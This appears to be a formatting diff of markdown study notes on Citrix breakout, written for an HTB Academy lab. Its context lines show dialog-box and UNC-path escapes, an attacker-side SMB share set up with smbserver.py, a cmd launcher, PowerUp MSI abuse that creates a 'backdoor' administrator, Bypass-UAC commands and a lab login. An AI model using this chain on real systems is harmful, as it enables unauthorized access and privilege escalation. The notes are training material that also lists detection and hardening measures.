@@ -1,4 +1,4 @@
-# Citrix Breakout
+# 🚪 Citrix Breakout
 
 ## 🎯 Overview
 
@@ -7,6 +7,7 @@
 ## 🔓 Basic Breakout Methodology
 
 ### Three-Step Process
+
 ```cmd
 1. Gain access to a Dialog Box
 2. Exploit the Dialog Box to achieve command execution  
@@ -14,6 +15,7 @@
 ```
 
 ### Environment Characteristics
+
 ```cmd
 # Highly restrictive environments typically have:
 - No cmd.exe/powershell.exe in Start Menu
@@ -25,6 +27,7 @@
 ## 📂 Bypassing Path Restrictions
 
 ### Dialog Box Methodology
+
 ```cmd
 # Applications with file interaction features provide dialog boxes:
 - Save/Save As
@@ -34,6 +37,7 @@
 ```
 
 ### MS Paint Dialog Box Example
+
 ```cmd
 # Steps:
 1. Run Paint from Start Menu
@@ -46,6 +50,7 @@
 ```
 
 ### UNC Path Technique
+
 ```cmd
 # UNC paths that work in dialog boxes:
 \\127.0.0.1\c$\users\<username>    # Local admin share
@@ -56,6 +61,7 @@
 ## 🌐 SMB Share Access from Restricted Environment
 
 ### Setting up SMB Server
+
 ```bash
 # On attacking machine (Ubuntu/Kali):
 smbserver.py -smb2support share $(pwd)
@@ -67,6 +73,7 @@ smbserver.py -smb2support share $(pwd)
 ```
 
 ### Accessing SMB Share via Dialog Box
+
 ```cmd
 # Steps:
 1. Open Paint > File > Open
@@ -80,6 +87,7 @@ smbserver.py -smb2support share $(pwd)
 ```
 
 ### Custom Breakout Binary
+
 ```c
 // pwn.c - Simple CMD launcher
 #include <stdlib.h>
@@ -94,6 +102,7 @@ int main() {
 ## 🛠️ Alternate File System Tools
 
 ### Explorer++ Bypass
+
 ```cmd
 # Why Explorer++:
 - Portable (no installation required)
@@ -108,6 +117,7 @@ int main() {
 ```
 
 ### Alternative File Managers
+
 ```cmd
 # Recommended tools:
 - Explorer++        # Most popular and effective
@@ -119,6 +129,7 @@ int main() {
 ## 🗝️ Alternate Registry Editors
 
 ### Registry Editor Bypass
+
 ```cmd
 # When regedit.exe is blocked by group policy:
 - Simpleregedit
@@ -130,6 +141,7 @@ int main() {
 ```
 
 ### Registry Editor Features
+
 ```cmd
 # Capabilities:
 - Full HKEY hive access
@@ -141,6 +153,7 @@ int main() {
 ## 🔗 Modifying Existing Shortcuts
 
 ### Shortcut Hijacking Process
+
 ```cmd
 # Steps:
 1. Right-click existing shortcut
@@ -156,6 +169,7 @@ C:\Windows\System32\mmc.exe
 ```
 
 ### Creating New Shortcuts
+
 ```powershell
 # PowerShell method for .lnk creation:
 $WshShell = New-Object -comObject WScript.Shell
@@ -167,6 +181,7 @@ $Shortcut.Save()
 ## 📝 Script Execution Bypass
 
 ### Batch File Method
+
 ```batch
 # Create evil.bat:
 1. Create new text file
@@ -179,6 +194,7 @@ $Shortcut.Save()
 ```
 
 ### Script Extension Exploitation
+
 ```cmd
 # When these extensions auto-execute:
 .bat    # Batch files
@@ -194,6 +210,7 @@ $Shortcut.Save()
 ## 🔺 Privilege Escalation in Citrix
 
 ### AlwaysInstallElevated Discovery
+
 ```cmd
 # Check registry for Always Install Elevated:
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -203,6 +220,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 ```
 
 ### PowerUp MSI Exploitation
+
 ```powershell
 # Using PowerUp for MSI creation:
 Import-Module .\PowerUp.ps1
@@ -213,6 +231,7 @@ Write-UserAddMSI
 ```
 
 ### User Creation via MSI
+
 ```cmd
 # MSI execution creates user dialog:
 Username: backdoor
@@ -223,6 +242,7 @@ Group: Administrators
 ```
 
 ### Runas for New User Context
+
 ```cmd
 # Switch to new admin user:
 runas /user:backdoor cmd
@@ -234,6 +254,7 @@ runas /user:backdoor cmd
 ## 🛡️ UAC Bypass
 
 ### UAC Bypass Necessity
+
 ```cmd
 # Even admin users face UAC restrictions:
 C:\Windows\system32> cd C:\Users\Administrator
@@ -243,6 +264,7 @@ Access is denied.
 ```
 
 ### Bypass-UAC Script Usage
+
 ```powershell
 # UAC bypass execution:
 Import-Module .\Bypass-UAC.ps1
@@ -255,6 +277,7 @@ Bypass-UAC -Method UacMethodSysprep
 ```
 
 ### Verification of Bypass
+
 ```cmd
 # Verify elevated privileges:
 whoami /all
@@ -268,6 +291,7 @@ dir *.txt
 ## 🎯 HTB Academy Lab Solutions
 
 ### Lab Environment
+
 ```cmd
 # Access method:
 1. RDP to target with htb-student:HTB_@cademy_stdnt!
@@ -277,6 +301,7 @@ dir *.txt
 ```
 
 ### Lab 1: User Flag (pmorgan Downloads)
+
 ```cmd
 # Objective: Get flag from C:\Users\pmorgan\Downloads
 # Method: Dialog box bypass to access restricted directory
@@ -289,6 +314,7 @@ dir *.txt
 ```
 
 ### Lab 2: Administrator Flag
+
 ```cmd
 # Objective: Get flag from C:\Users\Administrator\Desktop
 # Method: Full privilege escalation chain
@@ -307,6 +333,7 @@ dir *.txt
 ## 🔄 Complete Attack Chain
 
 ### Comprehensive Breakout Process
+
 ```cmd
 # 1. Initial access via dialog box
 Paint > File > Open > \\127.0.0.1\c$\users\<user>
@@ -345,6 +372,7 @@ cd C:\Users\Administrator
 ## 🛠️ Required Tools
 
 ### Essential Breakout Tools
+
 ```cmd
 # File system access:
 Explorer++.exe          # Alternative file manager
@@ -367,6 +395,7 @@ evil.bat              # Simple batch breakout
 ## ⚠️ Detection & Defense
 
 ### Detection Indicators
+
 ```cmd
 # Monitor for:
 - Unusual dialog box usage patterns
@@ -379,6 +408,7 @@ evil.bat              # Simple batch breakout
 ```
 
 ### Defensive Measures
+
 ```cmd
 # Hardening recommendations:
 - Block UNC path access in dialog boxes
@@ -394,13 +424,13 @@ evil.bat              # Simple batch breakout
 ## 💡 Key Takeaways
 
 1. **Dialog boxes** provide powerful bypass mechanisms for restricted environments
-2. **UNC paths** can circumvent File Explorer restrictions  
+2. **UNC paths** can circumvent File Explorer restrictions
 3. **Alternative tools** (Explorer++, registry editors) bypass group policy
 4. **SMB shares** enable tool transfer and execution in restricted environments
 5. **MSI exploitation** with AlwaysInstallElevated provides reliable privilege escalation
 6. **UAC bypass** is often necessary even with admin users
 7. **Script execution** (.bat, .vbs, .ps1) can provide multiple breakout vectors
 
----
+***
 
-*Citrix breakout techniques exploit the inherent trust in application dialog boxes and file interaction features to escape restricted virtualization environments and achieve privilege escalation.* 
+_Citrix breakout techniques exploit the inherent trust in application dialog boxes and file interaction features to escape restricted virtualization environments and achieve privilege escalation._
